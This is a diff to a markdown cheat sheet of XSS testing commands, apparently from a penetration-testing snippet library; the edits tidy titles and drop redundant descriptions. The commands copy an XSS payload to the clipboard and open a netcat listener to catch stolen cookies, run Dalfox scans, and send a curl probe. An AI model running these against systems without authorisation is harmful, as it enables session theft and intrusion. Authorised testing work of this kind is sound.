@@ -4,11 +4,9 @@
 
 ### XSS payload + listener
 
-List payload + listener with Xss.
-
 Copy a chosen XSS payload to clipboard and start a netcat listener for the cookie/data callback. Streamlines the paste-and-wait loop.
 
-```sh title:"XSS List Payload + Listener"
+```sh title:"Copy XSS payload to clipboard, start nc listener"
 echo '$xss_payloads' | xclip -sel clip && nc -lvnp $lport
 ```
 <!-- cheat
@@ -23,11 +21,9 @@ var lport
 
 ### Dalfox URL scan
 
-Scan dalfox URL scan with Xss.
-
 Scan a URL with Dalfox.
 
-```sh title:"XSS Scan Dalfox URL Scan"
+```sh title:"Scan URL for XSS with Dalfox"
 dalfox url "$url"
 ```
 <!-- cheat
@@ -36,11 +32,9 @@ var url
 
 ### Dalfox request scan
 
-Scan dalfox request scan with Xss.
-
 Scan a captured request with Dalfox.
 
-```sh title:"XSS Scan Dalfox Request Scan"
+```sh title:"Scan request for XSS with Dalfox"
 dalfox file "$request_file"
 ```
 <!-- cheat
@@ -49,11 +43,9 @@ var request_file
 
 ### Reflected parameter probe
 
-Scan reflected parameter probe with Xss.
-
 Send a controlled probe value to a parameter.
 
-```sh title:"XSS Scan Reflected Parameter Probe"
+```sh title:"Send reflected XSS probe"
 curl -sk "$url?$param=$probe"
 ```
 <!-- cheat
